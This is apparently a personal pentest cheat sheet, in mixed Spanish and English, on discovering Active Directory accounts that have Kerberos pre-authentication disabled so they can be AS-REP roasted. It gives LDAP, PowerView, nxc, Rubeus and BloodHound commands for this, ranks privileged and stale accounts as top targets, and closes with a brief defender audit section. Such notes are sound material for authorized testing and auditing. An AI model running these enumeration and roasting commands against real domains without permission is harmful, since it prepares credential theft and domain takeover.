---
aliases:
  - AS-REP Discovery
  - DONT_REQ_PREAUTH
  - PreAuth Disabled
tags:
  - type/technique
  - technique/credential-access
  - technique/kerberos
  - asset/active-directory
  - cred/kerberos
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[AS-REP Roasting]]"
---
# AS-REP Roasting - Discovery

***

## LDAP Filter (UAC bit 4194304)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `nxc ldap <DC> -u u -p p --asreproastable` | Bulk enum AS-REP roastable | Quick. |
| `nxc ldap <DC> -u u -p p --query "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" "samAccountName"` | LDAP filter raw | Custom. |
| `Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true}` | RSAT | Standard. |
| `Get-DomainUser -PreauthNotRequired -Properties samaccountname,useraccountcontrol` (PowerView) | Adversary | Sin RSAT. |
| `ldapsearch -h <DC> -D 'corp\u' -w pass -b "DC=corp,DC=local" "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" samAccountName userAccountControl` | LDAP raw | Linux. |
^asrep-discovery-ldap

**UAC bit:** `0x400000` (decimal `4194304`) = `DONT_REQ_PREAUTH`. LDAP bitwise filter `1.2.840.113556.1.4.803` matches exact bit set.

```bash
# Standard discovery
nxc ldap <DC> -u user -p pass --asreproastable

# Output:
# user1
# legacy_svc
# helpdesk_old
```

___

## Privileged AS-REP Roastable

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true -and AdminCount -eq 1}` | DA + AS-REP roastable (CRITICAL) | Top priority. |
| `nxc ldap <DC> -u u -p p --query "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304)(adminCount=1))" "samAccountName"` | LDAP filter | Quick. |
| BloodHound `MATCH (u:User {dontreqpreauth:true}) WHERE u.adminCount = true RETURN u.name` | Visual | Cypher. |
^asrep-discovery-priv

**Por qué priority:** AS-REP roast user normal = lateral foothold. AS-REP roast user en `Domain Admins` con password débil = direct DA.

___

## BloodHound Query

| **Cypher** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `MATCH (u:User {dontreqpreauth:true, enabled:true}) RETURN u.name` | All AS-REP roastable | Standard. |
| `MATCH (u:User {dontreqpreauth:true}) WHERE u.adminCount = true RETURN u.name` | Priv | Critical hunt. |
| `MATCH (u:User {dontreqpreauth:true, enabled:true}) WHERE u.lastlogon < timestamp() / 1000 - 15552000 RETURN u.name` | Stale + AS-REP (often weak pwd) | High-value. |
^asrep-discovery-bh

___

## UAC Bitfield Context

| **UAC bit** | **Hex** | **Significado** |
|:---:|:---:|:---:|
| `DONT_REQ_PREAUTH` | `0x400000` (4194304) | **AS-REP roastable**. |
| `DONT_EXPIRE_PASSWORD` | `0x10000` (65536) | Pwd never expires (cross-correlate). |
| `PASSWD_NOTREQD` | `0x20` (32) | Empty password allowed (bonus vuln). |
| `USE_DES_KEY_ONLY` | `0x200000` (2097152) | DES only (legacy). |
| `ACCOUNTDISABLE` | `0x2` (2) | Disabled (skip). |
^asrep-discovery-uac

```bash
# Cross-correlate AS-REP + never-expire pwd (older pwd → más crackeable)
nxc ldap <DC> -u u -p p --query \
  "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304)(userAccountControl:1.2.840.113556.1.4.803:=65536))" \
  "samAccountName,pwdLastSet"
```

___

## Cross-Trust AS-REP Discovery

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Server <foreign-DC>` | Cross-domain AS-REP enum | Multi-domain. |
| `(Get-ADForest).Domains \| % { Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Server $_ }` | Forest-wide | Multi-domain. |
| `Rubeus.exe asreproast /domain:partner.com /dc:<foreign-DC>` | Cross-domain Windows | Cross-trust. |
^asrep-discovery-cross

___

## Pre-Attack Validation

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true -and Enabled -eq $true} -Pr PasswordLastSet,LastLogonDate,AdminCount,Description` | Full audit con metadata | Pre-roast. |
^asrep-discovery-validate

```powershell
# Audit completo + export
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true -and Enabled -eq $true} `
  -Properties PasswordLastSet,LastLogonDate,AdminCount,Description |
  Select Name,SamAccountName,AdminCount,PasswordLastSet,LastLogonDate,Description |
  Sort AdminCount,PasswordLastSet -Descending |
  Export-Csv asrep_targets.csv -NoTypeInformation
```

___

## Auditoría Defender

| **Comando** | **Qué detecta** | **Cuándo** |
|:---:|:---:|:---:|
| `Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true}` | Inventory total | Quarterly. |
| `(Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} \| Measure).Count` | Count | Audit. |
| Compare con baseline (debe ser 0 idealmente) | Drift detection | Compliance. |
^asrep-discovery-audit

**Defender ideal:** **0 users con `DONT_REQ_PREAUTH`** en domain. Cualquier presencia = audit finding. Common legacy: cuentas pre-Win2008 migradas con flag heredado.

***
